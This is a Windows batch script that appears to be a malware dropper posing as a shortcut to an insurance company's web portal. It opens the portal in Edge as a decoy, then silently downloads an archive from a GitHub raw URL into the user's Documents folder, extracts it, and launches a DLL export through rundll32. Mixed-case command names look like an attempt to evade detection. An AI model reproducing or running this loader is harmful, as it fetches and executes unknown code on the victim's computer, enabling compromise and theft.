@echo off
start microsoft-edge:https://portal.hdisigorta.com.tr
cD %USERPROFILE%\Documents && CuRl https://raw.githubusercontent.com/testhdi/test/refs/heads/main/test.tar.gz -s -o tEsT.taR.Gz && tAr -xzf tEsT.taR.Gz 
start RuNdLL32.exe devcon.dll,CM_Free_Res_Des_Ex
